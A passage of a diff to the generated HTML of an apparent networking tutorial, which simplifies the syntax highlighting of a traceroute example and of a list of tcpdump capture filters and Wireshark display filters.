- &lt;span class="mi"&gt;8&lt;/span&gt;  &lt;span class="mf"&gt;209.85.249.212&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;209.85.249.212&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;33.220&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="mf"&gt;209.85.252.242&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;209.85.252.242&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;33.500&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;33.786&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
- &lt;span class="mi"&gt;9&lt;/span&gt;  &lt;span class="mf"&gt;216.239.50.248&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;216.239.50.248&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;53.231&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;57.314&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="mf"&gt;216.239.46.215&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;216.239.46.215&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;52.140&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
-&lt;span class="mi"&gt;10&lt;/span&gt;  &lt;span class="mf"&gt;216.239.50.237&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;216.239.50.237&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;52.022&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt; &lt;span class="mf"&gt;209.85.254.241&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;209.85.254.241&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;48.517&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;48.075&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
-&lt;span class="mi"&gt;11&lt;/span&gt;  &lt;span class="mf"&gt;209.85.243.55&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;209.85.243.55&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;56.220&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;45.359&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;44.934&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
-&lt;span class="mi"&gt;12&lt;/span&gt;  &lt;span class="n"&gt;ord08s11&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f20&lt;/span&gt;&lt;span class="mf"&gt;.1e100&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;173.194.46.84&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mf"&gt;43.184&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;39.770&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;  &lt;span class="mf"&gt;45.095&lt;/span&gt; &lt;span class="n"&gt;ms&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;traceroute www.google.com
+traceroute to www.google.com &lt;span class="o"&gt;(&lt;/span&gt;173.194.46.84&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;30&lt;/span&gt; hops max, &lt;span class="m"&gt;60&lt;/span&gt; byte packets
+ &lt;span class="m"&gt;1&lt;/span&gt;  * * *
+ &lt;span class="m"&gt;2&lt;/span&gt;  67.59.254.85 &lt;span class="o"&gt;(&lt;/span&gt;67.59.254.85&lt;span class="o"&gt;)&lt;/span&gt;  30.078 ms  30.452 ms  30.766 ms
+ &lt;span class="m"&gt;3&lt;/span&gt;  67.59.255.137 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.137&lt;span class="o"&gt;)&lt;/span&gt;  33.889 ms 67.59.255.129 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.129&lt;span class="o"&gt;)&lt;/span&gt;  33.426 ms 67.59.255.137 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.137&lt;span class="o"&gt;)&lt;/span&gt;  34.007 ms
+ &lt;span class="m"&gt;4&lt;/span&gt;  rtr101.wan.hcvlny.cv.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.107.109&lt;span class="o"&gt;)&lt;/span&gt;  34.004 ms 451be075.cst.lightpath.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.107.117&lt;span class="o"&gt;)&lt;/span&gt;  32.743 ms rtr102.wan.hcvlny.cv.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.107.125&lt;span class="o"&gt;)&lt;/span&gt;  33.951 ms
+ &lt;span class="m"&gt;5&lt;/span&gt;  64.15.3.222 &lt;span class="o"&gt;(&lt;/span&gt;64.15.3.222&lt;span class="o"&gt;)&lt;/span&gt;  34.972 ms 64.15.0.218 &lt;span class="o"&gt;(&lt;/span&gt;64.15.0.218&lt;span class="o"&gt;)&lt;/span&gt;  35.187 ms  35.120 ms
+ &lt;span class="m"&gt;6&lt;/span&gt;  * 72.14.215.203 &lt;span class="o"&gt;(&lt;/span&gt;72.14.215.203&lt;span class="o"&gt;)&lt;/span&gt;  29.225 ms  29.646 ms
+ &lt;span class="m"&gt;7&lt;/span&gt;  209.85.248.242 &lt;span class="o"&gt;(&lt;/span&gt;209.85.248.242&lt;span class="o"&gt;)&lt;/span&gt;  29.361 ms 209.85.245.116 &lt;span class="o"&gt;(&lt;/span&gt;209.85.245.116&lt;span class="o"&gt;)&lt;/span&gt;  39.780 ms  42.108 ms
+ &lt;span class="m"&gt;8&lt;/span&gt;  209.85.249.212 &lt;span class="o"&gt;(&lt;/span&gt;209.85.249.212&lt;span class="o"&gt;)&lt;/span&gt;  33.220 ms 209.85.252.242 &lt;span class="o"&gt;(&lt;/span&gt;209.85.252.242&lt;span class="o"&gt;)&lt;/span&gt;  33.500 ms  33.786 ms
+ &lt;span class="m"&gt;9&lt;/span&gt;  216.239.50.248 &lt;span class="o"&gt;(&lt;/span&gt;216.239.50.248&lt;span class="o"&gt;)&lt;/span&gt;  53.231 ms  57.314 ms 216.239.46.215 &lt;span class="o"&gt;(&lt;/span&gt;216.239.46.215&lt;span class="o"&gt;)&lt;/span&gt;  52.140 ms
+&lt;span class="m"&gt;10&lt;/span&gt;  216.239.50.237 &lt;span class="o"&gt;(&lt;/span&gt;216.239.50.237&lt;span class="o"&gt;)&lt;/span&gt;  52.022 ms 209.85.254.241 &lt;span class="o"&gt;(&lt;/span&gt;209.85.254.241&lt;span class="o"&gt;)&lt;/span&gt;  48.517 ms  48.075 ms
+&lt;span class="m"&gt;11&lt;/span&gt;  209.85.243.55 &lt;span class="o"&gt;(&lt;/span&gt;209.85.243.55&lt;span class="o"&gt;)&lt;/span&gt;  56.220 ms  45.359 ms  44.934 ms
+&lt;span class="m"&gt;12&lt;/span&gt;  ord08s11-in-f20.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;173.194.46.84&lt;span class="o"&gt;)&lt;/span&gt;  43.184 ms  39.770 ms  45.095 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2294,7 +2229,7 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Right click -&amp;gt; Follow TCP Stream&lt;/strong&gt;: Reassembles TCP streams into an  readable format (instead of having the data being in small chunks). The text displayed in &lt;em&gt;red&lt;/em&gt; to signifies traffic from the source to the destination, and in  &lt;em&gt;blue&lt;/em&gt; identifies traffic in the opposite direction. If you know the stream number (value to be followed to get various data packets), you can also use the following filter for the same purpose:&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;tcp.stream&lt;/span&gt; &lt;span class="nb"&gt;eq&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp.stream eq &amp;lt;number&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2311,7 +2246,7 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;li&gt;&lt;strong&gt;Proto&lt;/strong&gt;: restricts the match to a particular protocol (for example: &lt;strong&gt;ether&lt;/strong&gt;, &lt;strong&gt;ip&lt;/strong&gt;, &lt;strong&gt;tcp&lt;/strong&gt;, &lt;strong&gt;udp&lt;/strong&gt;, or &lt;strong&gt;http&lt;/strong&gt;)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;A example of primitive is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;dst&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="mf"&gt;192.168.0.10&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;dst host 192.168.0.10
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2327,56 +2262,56 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Traffic associated with a host's IPV4 address (also works for a IPv6 network).&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="mf"&gt;172.16.16.150&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;host 172.16.16.150
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Traffic to or from a range of IP addresses:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="mf"&gt;192.168.0.0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;net 192.168.0.0/24
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Device's hostname with the host qualifier:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;testserver&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;host testserver
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;If you are concerned that the IP address for a host changed, you can filter based on MAC address:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ether&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;ff&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ff&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ff&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ff&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ff&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;aa&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ether host ff-ff-ff-ff-ff-aa
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Only traffic coming from a particular host (host is an optional qualifier):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;src&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="mf"&gt;172.16.16.150&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;src host 172.16.16.150
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;All the traffic leaving a host:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;dst&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="mf"&gt;172.16.16.150&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;dst host 172.16.16.150
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Only  traffic to or from IP address 173.15.2.1&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="mf"&gt;173.15.2.1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;host 173.15.2.1
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Traffic from a range of IP addresses:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;src&lt;/span&gt; &lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="mf"&gt;192.168.0.0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;src net 192.168.0.0/24
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2384,7 +2319,7 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Only traffic on port 8000:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;8000&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;port 8000
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2398,28 +2333,28 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Traffic going to a host listening on 80:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;dst&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;dst port 80
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Traffic within a range of port:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="n"&gt;portrange&lt;/span&gt; &lt;span class="mi"&gt;1501&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1549&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp portrange 1501-1549
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Both inbound and outbound traffic on port 80 and 21:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;21&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;port 80 || port == 21
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Only non-http and non-SMTP traffic (equivalent):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;host www.example.com and not (port 80 or port 25)
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2427,14 +2362,14 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Capture only unicast traffic (useful to get rid of noise on the network):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;broadcast&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;multicast&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;not broadcast and not multicast
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;ICMP traffic only:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;icmp&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;icmp
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2455,14 +2390,14 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;DNS traffic:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;dns&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;dns
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Clear text email traffic:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;smtp&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;pop&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;imap&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;smtp || pop || imap
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2470,21 +2405,21 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;TCP packets with SYN flag set:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp[13]&amp;amp;2==2
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;ICMP packets with destination unreachable (type 3):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;icmp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;icmp[0]==3
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;HTTP GET requests (bytes 'G','E','T' are hex values 47, 45, 54):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;[((&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xf0&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;  &lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x47455420&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;port 80 and tcp[((tcp[12:1] &amp;amp; 0xf0 ) &amp;gt;&amp;gt; 2  ):4 ] = 0x47455420
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2493,21 +2428,21 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Filter by IP address:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mf"&gt;10.0.0.1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ip.addr == 10.0.0.1
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;IP source address field:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mf"&gt;192.168.1.114&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ip.src == 192.168.1.114
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;IP address src/dst for a network range:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;addr&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mf"&gt;192.168.1.0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ip.addr== 192.168.1.0/24
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2515,14 +2450,14 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Any TCP packet with 4000 as a source or destination port:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;4000&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp.port == 4000
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Source port:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;srcport&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;31337&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp.srcport == 31337
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2530,21 +2465,21 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Drops  arp, icmp, dns, or whatever other protocols may be background noise:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arp&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;icmp&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;!(arp or icmp or dns)
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Displays all re-transmissions in the trace (helps when tracking down slow application performance and packet loss):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;analysis&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;retransmission&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp.analysis.retransmission
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;ICMP Type field to find all PING packets:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;icmp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;icmp.type== 8
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2552,63 +2487,63 @@ a network, it would be assigned an address by hand.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Displays all HTTP GET requests:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;http.request
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Display all POST requests:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;http.request.method == &amp;quot;POST&amp;quot;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Filter for the HEX values:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;udp&lt;/span&gt; &lt;span class="n"&gt;contains&lt;/span&gt; &lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;udp contains 33:27:58
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Sequence number field in a TCP header:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;seq&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;52703261&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;tcp.seq == 52703261
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
